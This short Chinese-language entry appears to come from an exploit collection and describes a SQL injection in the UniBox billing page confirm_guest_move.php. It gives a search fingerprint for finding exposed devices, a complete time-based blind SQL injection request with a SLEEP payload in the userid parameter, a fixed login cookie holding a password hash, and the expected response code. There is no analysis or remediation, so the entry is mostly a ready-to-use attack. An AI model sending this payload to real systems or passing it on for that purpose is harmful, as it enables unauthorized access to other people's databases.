# Uniboxconfirm_guest_move.phpsql注入漏洞

- **系统**：Uniboxconfirm　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="UniBox"`
- **请求**：`GET /billing/confirm_guest_move.php?confirmdelete=1&userid=1'+AND+(SELECT+8376+FROM+(SELECT(SLEEP(5)))JLmq)+AND+'OQHQ'%3d'OQHQ HTTP/1.1`
- **关键头**：`Cookie: user=unibox; pass=294a3d333d2f6b7e121594189fce9a72`
- **预期**：200　|　—